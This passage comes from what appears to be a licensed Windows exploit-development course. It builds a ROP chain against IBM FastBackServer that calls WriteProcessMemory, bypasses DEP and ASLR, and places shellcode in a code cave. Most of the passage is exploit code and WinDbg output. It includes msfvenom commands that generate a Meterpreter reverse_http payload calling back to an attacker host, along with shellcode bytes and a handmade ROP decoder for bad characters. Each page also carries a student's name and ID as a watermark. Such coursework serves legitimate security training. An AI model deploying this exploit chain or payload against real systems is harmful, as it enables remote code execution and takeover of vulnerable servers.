rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret 
rop += pack("<L", (0x77777878)) 
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret 
Listing 570 - ROP chain to align EAX with the shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
473 
Listing 570 shows that the gadget we use to overwrite EIP will copy the stack pointer into ESI. 
Next, we’ll get the stack address from ESI into EAX and increase it, pointing it to the shellcode 
address on the stack. 
The EAX alignment shown in Listing 570 reuses a technique from a previous module in which we 
subtract a small value from EAX by, paradoxically, adding a large value in order to avoid NULL 
bytes. 
In the next step, we update the lpBuffer dummy argument. The gadget we’ll use to patch the 
dummy argument uses the “MOV [EAX], ECX” instruction, so we must move the address of the 
shellcode into ECX first. We also need to obtain the stack address where the lpBuffer argument 
should be patched in EAX. A ROP chain to perform this is shown in Listing 571. 
rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 
0x0010 
rop += pack("<L", (0x42424242))         # junk into esi 
rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret  
rop += pack("<L", (0x42424242))         # junk for ret 0x10 
rop += pack("<L", (0x42424242))         # junk for ret 0x10 
rop += pack("<L", (0x42424242))         # junk for ret 0x10 
rop += pack("<L", (0x42424242))         # junk for ret 0x10 
rop += pack("<L", (0xfffffee0))         # pop into eax 
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x1fd8))   # mov [eax], ecx ; ret 
Listing 571 - ROP chain to patch lpNumberOfBytesWritten 
As highlighted in the ROP chain above, the first gadget uses a return instruction with an offset of 
0x10. As a result, execution will return to the “POP EAX” gadget’s address on the stack, and the 
stack pointer is then increased by 0x10. Because of this we need to insert 0x10 junk bytes before 
the value (0xfffffee0) that is popped into EAX. 
Next, our ROP chain pops the value 0xfffffee0 into EAX and adds the contents of ECX to it. 
0xfffffee0 corresponds to -0x120, which is the correct value to align EAX with the lpBuffer 
placeholder (shellcode pointer) on the stack. Finally, the last gadget overwrites the lpBuffer 
argument with the real shellcode address. 
To test this, let’s restart FastBackServer and attach WinDbg. If we place a breakpoint on the 
gadget that writes the real shellcode address on the stack (libeay32IBM019+0x1fd8), we can step 
over the mov instruction and display the updated ROP skeleton on the stack. 
0:078> bp libeay32IBM019+0x1fd8 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
 
0:078> g 
Breakpoint 0 hit 
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360 
eip=03111fd8 esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48: 
03111fd8 8908            mov     dword ptr [eax],ecx  ds:0023:0dbbe2fc=41414141 
 
0:063> p 
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
474 
eip=03111fda esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a: 
03111fda c3              ret 
 
0:063> dd eax-10 L7 
0dbbe2ec  75f42890 031a2c04 ffffffff 031a2c04 
0dbbe2fc  0dbbe41c 42424242 031f401c 
 
0:063> dd 0dbbe41c L8 
0dbbe41c  44444444 44444444 44444444 44444444 
0dbbe42c  44444444 44444444 44444444 44444444 
Listing 572 - ROP skeleton as seen on the stack 
With the shellcode address correctly patched, our ROP skeleton on the stack is almost complete. 
Next, we need to overwrite the dummy shellcode size, which in the listing above is represented by 
0x42424242. 
As with prior ROP chains, we should reuse as many gadgets as possible when we need to repeat 
similar actions. 
The shellcode size does not have to be precise. If it is too large, additional stack content will 
simply be copied as well. Most 32-bit Metasploit-generated shellcodes are smaller than 500 
bytes, so we can use an arbitrary size value of -524 (0xfffffdf4) and then negate it to make it 
positive. 
Listing 573 shows the ROP chain for this step. 
# Patching nSize 
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret 
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret 
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret 
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret 
rop += pack("<L", (dllBase + 0x408dd)) # push eax ; pop esi ; ret  
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret  
rop +? pack("<L", (0xfffffdf4))     # -524 
rop += pack("<L", (dllBase + 0x1d8c2)) # neg eax ; ret 
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 
0x0010 
rop += pack("<L", (0x42424242)) # junk into esi 
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
Listing 573 - Patching nSize with ROP 
In the above ROP chain we first increase EAX (which points to lpBuffer on the stack) by four to 
align it with the nSize dummy argument. 
Next, we save the updated EAX pointer by copying it to ESI. We do this because with our available 
gadgets, there’s no simple way to obtain the shellcode size in ECX. Instead, we’ll use EAX for this 
arithmetic and then copy the result to ECX. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
475 
For the last copy operation, we’ll use a gadget that both copies the content of EAX into ECX and 
restores EAX from ESI. We have already encountered this gadget in the previous step. It contains 
a return instruction with an offset of 0x10, which we need to account for in the ROP chain (0x10 
junk bytes). 
Let’s test this new step by restarting FastBackServer and attaching WinDbg. Once again, we’ll set 
a breakpoint on the gadget that patches values on the stack. We’ll continue execution until the 
breakpoint is triggered a second time. 
0:079> bp libeay32IBM019+0x1fd8 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
 
0:079> g 
Breakpoint 0 hit 
eax=1223e2fc ebx=073db868 ecx=1223e41c edx=77251670 esi=42424242 edi=00669360 
eip=044e1fd8 esp=1223e364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48: 
044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e2fc=41414141 
 
0:085> g 
Breakpoint 0 hit 
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360 
eip=044e1fd8 esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48: 
044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e300=42424242 
 
0:085> p 
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360 
eip=044e1fda esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a: 
044e1fda c3              ret 
 
0:085> dd eax-14 L7 
1223e2ec  75f42890 04572c04 ffffffff 04572c04 
1223e2fc  1223e41c 0000020c 045c401c 
Listing 574 - ROP skeleton with nSize overwritten 
Excellent! Listing 574 shows that the ROP chain patched the nSize argument correctly. 
At this point, we have correctly set up the address for WriteProcessMemory, the return address, 
and all arguments on the stack. 
The last step in our ROP chain is to align EAX with the WriteProcessMemory address in the ROP 
skeleton on the stack, exchange it with ESP, and return into it. 
We’ll do this the same way we aligned EAX earlier. From Listing 574, we know that EAX points 
0x14 bytes ahead of WriteProcessMemory on the stack. We can fix that easily with previously 
used gadgets. The updated ROP chain is shown below. 
# Align ESP with ROP Skeleton 
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
476 
rop += pack("<L", (0xffffffec))         # -0x14 
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret 
Listing 575 - Aligning ESP with ROP skeleton 
In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added it to EAX, and then 
used a gadget with an XCHG instruction to align ESP to the stack address stored in EAX. 
After executing this part of the ROP chain, we should return into WriteProcessMemory with all the 
arguments set up correctly. We can observe this in practice by restarting FastBackServer, 
attaching WinDbg, and setting a breakpoint on the “XCHG EAX, ESP” gadget. 
0:080> bp libeay32IBM019+0x5b415 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
 
0:080> g 
Breakpoint 0 hit 
eax=110ee2ec ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360 
eip=031bb415 esp=110ee3b0 ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85: 
031bb415 94              xchg    eax,esp 
 
0:085> p 
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360 
eip=031bb416 esp=110ee2ec ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x86: 
031bb416 c3              ret 
 
0:085> p 
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360 
eip=75f42890 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
KERNEL32!WriteProcessMemoryStub: 
75f42890 8bff            mov     edi,edi 
 
0:085> dds esp L6 
110ee2f0  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c 
110ee2f4  ffffffff 
110ee2f8  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c 
110ee2fc  110ee41c 
110ee300  0000020c 
110ee304  0324401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018 
Listing 576 - Executing WriteProcessMemory from ROP 
Listing 576 shows that WriteProcessMemory was invoked and all arguments were set up 
correctly. We’ll note that lpBuffer is stored at 0x110ee41c. 
To verify that WriteProcessMemory copies our dummy shellcode, we can dump the contents of 
the code cave before and after the API executes. 
0:085> u 031f2c04 
libeay32IBM019!N98E_bn_sub_words+0x107c: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
477 
031f2c04 0000            add     byte ptr [eax],al 
031f2c06 0000            add     byte ptr [eax],al 
031f2c08 0000            add     byte ptr [eax],al 
031f2c0a 0000            add     byte ptr [eax],al 
031f2c0c 0000            add     byte ptr [eax],al 
031f2c0e 0000            add     byte ptr [eax],al 
031f2c10 0000            add     byte ptr [eax],al 
031f2c12 0000            add     byte ptr [eax],al 
 
0:085> pt 
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
KERNELBASE!WriteProcessMemory+0x74: 
745f82a4 c21400          ret     14h 
 
0:085> u 031f2c04  
libeay32IBM019!N98E_bn_sub_words+0x107c: 
031f2c04 44              inc     esp 
031f2c05 44              inc     esp 
031f2c06 44              inc     esp 
031f2c07 44              inc     esp 
031f2c08 44              inc     esp 
031f2c09 44              inc     esp 
031f2c0a 44              inc     esp 
031f2c0b 44              inc     esp 
Listing 577 - WriteProcessMemory copies data into code page 
The contents of the code cave before and after WriteProcessMemory execution show that our 
fake shellcode data of 0x44 bytes was copied from the stack into the code cave. 
Let’s return from WriteProcessMemory and prove that DEP was bypassed by executing the “INC 
ESP” instructions (0x44 opcode) from the code cave: 
0:085> r 
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
KERNELBASE!WriteProcessMemory+0x74: 
745f82a4 c21400          ret     14h 
 
0:085> p 
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=031f2c04 esp=110ee308 ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
libeay32IBM019!N98E_bn_sub_words+0x107c: 
031f2c04 44              inc     esp 
 
0:085> p 
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=031f2c05 esp=110ee309 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
libeay32IBM019!N98E_bn_sub_words+0x107d: 
031f2c05 44              inc     esp 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
478 
0:085> p 
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=031f2c06 esp=110ee30a ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
libeay32IBM019!N98E_bn_sub_words+0x107e: 
031f2c06 44              inc     esp 
Listing 578 - Executing arbitrary instructions 
We have bypassed both ASLR and DEP and have obtained arbitrary code execution. Very Nice! 
In this case, we only executed our padding of 0x44 byte values, but next we’ll replace it with 
shellcode to obtain a reverse shell. 
10.4.1.1 Exercises 
1. 
Go through the ROP chain required to execute WriteProcessMemory and implement it in your 
own proof of concept. 
2. 
Obtain arbitrary code execution inside the code cave. 
3. 
Improve the proof of concept to detect and handle bad characters in the ROP gadgets once 
they are added to the base address of libeay32IBM019.dll. 
10.4.2 
Getting Our Shell 
At this point, we’ve achieved our initial goal of bypassing ASLR by leaking the base address of an 
IBM module. We have also bypassed DEP to obtain code execution. 
To complete our exploit, let’s replace our padding data with a Meterpreter shellcode to get a 
reverse shell. 
First, we’ll need to find the offset from the end of the ROP chain to the lpBuffer stack address 
where our shellcode will reside. This value will be used to calculate the size of the padding area 
prepended to our shellcode. Next, we’ll generate an encoded Meterpreter shellcode to replace the 
dummy shellcode. 
To figure out the offset, we can display data at an address lower than the value in lpBuffer. 
Earlier, we found lpBuffer at the stack address 0x110ee41c. If we subtract 0x70 bytes, we find the 
stack content shown in Listing 579. 
0:085> dd 110ee41c-70 
110ee3ac  031bb415 44444444 44444444 44444444 
110ee3bc  44444444 44444444 44444444 44444444 
110ee3cc  44444444 44444444 44444444 44444444 
110ee3dc  44444444 44444444 44444444 44444444 
110ee3ec  44444444 44444444 44444444 44444444 
110ee3fc  44444444 44444444 44444444 44444444 
110ee40c  44444444 44444444 44444444 44444444 
110ee41c  44444444 44444444 44444444 44444444 
 
0:085> ? 110ee41c - 110ee3b0   
Evaluate expression: 108 = 0000006c 
Listing 579 - Offset from last ROP gadget to lpBuffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
479 
Here we discover that the offset from the first DWORD after the ROP chain to lpBuffer is 0x6C 
bytes. We must add 0x6C bytes of padding before placing the shellcode. 
Let’s update our proof of concept with a second offset variable (offset2) and some dummy 
shellcode as shown below. 
... 
offset2 = b"C" * 0x6C 
shellcode = b"\x90" * 0x100 
padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0) 
buf += formatString 
... 
Listing 580 - Updated proof of concept to include shellcode alignment 
After these changes, lpBuffer will point to our dummy shellcode and WriteProcessMemory will 
copy the shellcode into the code cave. 
To test the updated proof of concept, we’ll restart FastBackServer, attach WinDbg, set a 
breakpoint on WriteProcessMemory, and launch the exploit: 
0:078> bp KERNEL32!WriteProcessMemoryStub 
 
0:078> g 
Breakpoint 0 hit 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
eax=0dcde3b0 ebx=060bbf98 ecx=ffffffec edx=76fd1670 esi=42424242 edi=00669360 
eip=75342890 esp=0dcde2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
KERNEL32!WriteProcessMemoryStub: 
75342890 8bff            mov     edi,edi 
 
0:081> dds esp L6 
0dcde2f0  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c 
0dcde2f4  ffffffff 
0dcde2f8  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c 
0dcde2fc  0dcde41c 
0dcde300  0000020c 
0dcde304  0334401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018 
 
0:081> dd 0dcde41c-10 L8 
0dcde40c  43434343 43434343 43434343 43434343 
0dcde41c  90909090 90909090 90909090 90909090 
Listing 581 - Dummy shellcode is aligned correctly 
By subtracting 0x10 bytes from lpBuffer, we can verify that our dummy shellcode starts exactly 
where lpBuffer points. 
Next, let’s generate windows/meterpreter/reverse_http shellcode with msfvenom, remembering to 
supply the bad characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
480 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 
LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode 
... 
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai 
x86/shikata_ga_nai succeeded with size 590 (iteration=0) 
x86/shikata_ga_nai chosen with final size 590 
Payload size: 590 bytes 
Final size of python file: 3295 bytes 
shellcode =  b"" 
shellcode += b"\xdb\xd9\xba\xcc\xbb\x60\x18\xd9\x74\x24\xf4" 
shellcode += b"\x58\x33\xc9\xb1\x8d\x31\x50\x1a\x83\xc0\x04" 
shellcode += b"\x03\x50\x16\xe2\x39\x47\x88\x9a\xc1\xb8\x49" 
shellcode += b"\xfb\x48\x5d\x78\x3b\x2e\x15\x2b\x8b\x25\x7b" 
shellcode += b"\xc0\x60\x6b\x68\x53\x04\xa3\x9f\xd4\xa3\x95" 
... 
Listing 582 - Encoded Meterpreter shellcode 
We can now insert the generated shellcode in the proof of concept using the shellcode variable. 
Once again, we’ll restart FastBackServer, attach WinDbg, and set a breakpoint on 
WriteProcessMemory. Listing 583 shows the results from WinDbg when the proof of concept is 
executed. 
0:078> bp KERNEL32!WriteProcessMemoryStub 
 
0:078> g 
Breakpoint 0 hit 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
eax=1111e3b0 ebx=05ebc5b0 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360 
eip=75f42890 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
KERNEL32!WriteProcessMemoryStub: 
75f42890 8bff            mov     edi,edi 
 
0:085> pt 
eax=00000001 ebx=05ebc5b0 ecx=00000000 edx=77251670 esi=42424242 edi=00669360 
eip=745f82a4 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
KERNELBASE!WriteProcessMemory+0x74: 
745f82a4 c21400          ret     14h 
 
0:085> u poi(esp) 
libeay32IBM019!N98E_bn_sub_words+0x107c: 
01bb2c04 dbd9            fcmovnu st,st(1) 
01bb2c06 baccbb6018      mov     edx,1860BBCCh 
01bb2c0b d97424f4        fnstenv [esp-0Ch] 
01bb2c0f 58              pop     eax 
01bb2c10 33c9            xor     ecx,ecx 
01bb2c12 b18d            mov     cl,8Dh 
01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx 
01bb2c17 83c004          add     eax,4 
Listing 583 - Encoded Meterpreter shellcode in memory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
481 
Once we reach the beginning of WriteProcessMemory, we can execute the function to the end and 
dump the copied shellcode to verify that it’s been copied to the code cave. 
Unfortunately, after continuing execution, we encounter an access violation: 
0:085> g 
(1a54.fe8): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=01bb2c04 ebx=05ebc5b0 ecx=0000008d edx=1860bbcc esi=42424242 edi=00669360 
eip=01bb2c14 esp=1111e30c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
libeay32IBM019!N98E_bn_sub_words+0x108c: 
01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx ds:0023:01bb2c1e=9a884739 
Listing 584 - Access violation due to shellcode decoding stub 
The highlighted assembly instruction attempted to modify a memory location pointed to by 
EAX+0x1A, which caused the crash. 
From Listing 584 we notice that EAX points to an address within the code cave where the 
shellcode has been copied. We’re encountering an access violation error because the shellcode’s 
decoding stub expects the code to be stored in writable memory, but it is not. 
This means we won’t be able to use the msfvenom encoder, so we’ll have to find a different 
solution. Fortunately, we have a few options. 
We could write custom shellcode that does not contain any bad characters and by extension 
does not require a decoding routine. Alternatively, we could replace the bad characters and then 
leverage additional ROP gadgets to restore the shellcode before it’s copied into the code section. 
In the next section, we’ll pursue the latter approach. 
10.4.2.1 Exercises 
1. 
Calculate the offset from the ROP chain to the dummy shellcode. 
2. 
Insert shellcode into the buffer at the correct offset and observe the decoder causing a 
crash. 
10.4.3 
Handmade ROP Decoder 
At this point, we know we need to avoid bad characters in our shellcode and can not rely on the 
msfvenom decoder. In this section, we’ll learn how to manually implement a ROP decoder and 
test it. 
First, let’s replace the bad characters with safe alternatives that will not break the exploit. To 
begin, we’ll select arbitrary replacement characters, as shown in Listing 585. 
0x00 -> 0xff 
0x09 -> 0x10 
0x0a -> 0x06 
0x0b -> 0x07 
0x0c -> 0x08 
0x0d -> 0x05 
0x20 -> 0x1f 
Listing 585 - Character substitution scheme 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
482 
To implement this technique, we’ll first generate a windows/meterpreter/reverse_http payload in 
Python format (without encoding it): 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 
LPORT=8080 -f python -v shellcode 
... 
No encoder or badchars specified, outputting raw payload 
Payload size: 596 bytes 
Final size of python file: 3336 bytes 
shellcode =  b"" 
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0" 
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b" 
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61" 
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2" 
... 
Listing 586 - Encoded Meterpreter shellcode 
Since we’re going to manually replace these characters for now, we’ll only work on the first 20 
bytes of the shellcode to determine if the technique works. 
Listing 587 shows the substitutions performed on the substring. 
Before: 
\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52 
 
After: 
\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52 
Listing 587 - First characters are substituted 
We can easily make these manual edits in our shellcode with a Python script. However, restoring 
the script with ROP at runtime is more challenging. 
Let’s start by creating a ROP chain to restore the first 0x00 byte, which was replaced with an 0xff 
byte. 
Our complete ROP chain will perform three actions going forward. First, it will patch the 
arguments for WriteProcessMemory, then it will restore the shellcode, and finally, it will execute 
WriteProcessMemory. 
Below is the ROP chain we’ll use to restore the first bad character. 
# Restore first three shellcode bytes 
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret 
rop += pack("<L", (negative value))     # negative offset 
rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret 
rop += pack("<L", (original value))      # value into BH 
rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret 
Listing 588 - ROP gadgets to fix a bad character 
This new ROP chain will be inserted just after the gadgets that patch nSize on the stack. At this 
point, EAX will contain the stack address where the nSize argument is stored. To align EAX with 
the first bad character to fix, we can pop an appropriate negative value into ECX and subtract it 
from EAX. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
483 
pop ecx ; ret 
negative offset 
sub eax, ecx ; 
Listing 589 - Aligning EAX 
With EAX aligned, our next step is to restore the bad character. We will do this by loading an 
appropriate value into EBX and then adding the byte in BH to the value pointed to by EAX. 
pop ebx ; ret 
value into BH 
add [eax+1], bh ; ret 
Listing 590 - Restoring the bad character 
For every bad character that we have to decode, we’ll need to determine both the negative offset 
value to subtract from EAX and the value to place into BH. 
First, let’s find the correct value for BH. We are going to restore the bad character 0x00, which 
was replaced by the fourth byte in the shellcode, 0xff. We can add 0x01 to 0xff to restore the 
shellcode byte. 
We can load the correct value in BH while avoiding bad characters by popping the value 
0x1111__01__11 into EBX. 
Next, let’s calculate the negative offset. Recall that when the decoder ROP chain is executed, EAX 
points to nSize on the stack. 
Before moving forward with this step, we need to make a couple of adjustments to our proof of 
concept that will influence the negative offset we have to calculate. For each bad character we fix, 
we’ll be increasing the size of our final ROP chain. To account for this, we’ll adjust the lpBuffer 
(shellcode) address on the stack to create enough additional space. 
We will also increase the size of our entire input buffer to account for our larger combined offset 
and ROP chain. Listing 591 shows the first psCommandBuffer increased to 0x1100. 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)      # opcode 
buf += pack("<i", 0x0)        # 1st memcpy: offset 
buf += pack("<i", 0x1100)    # 1st memcpy: size field 
buf += pack("<i", 0x0)        # 2nd memcpy: offset 
buf += pack("<i", 0x100)      # 2nd memcpy: size field 
buf += pack("<i", 0x0)        # 3rd memcpy: offset 
buf += pack("<i", 0x100)      # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
Listing 591 - Update size of psCommandBuffer 
Next, let’s modify the address stored in lpBuffer. 
# Patching lpBuffer 
rop = pack("<L", (dllBase + 0x296f)) # mov eax, esi ; pop esi ; ret 
rop += pack("<L", (0x42424242)) # junk into esi 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0x88888888)) 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
484 
rop += pack("<L", (0x77777d78)) 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 
0x0010 
rop += pack("<L", (0x42424242)) # junk into esi 
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret  
... 
Listing 592 - Increase address of lpBuffer 
In Listing 592, we increased the offset from the start of the ROP chain to the beginning of our 
shellcode (lpBuffer) from 0x100 to 0x600 by modifying the highlighted value. 
Additionally, we must ensure that the subtraction we perform to align EAX with the ROP skeleton 
takes this 0x500 byte offset into account. 
... 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
rop += pack("<L", (0x42424242)) # junk for ret 0x10 
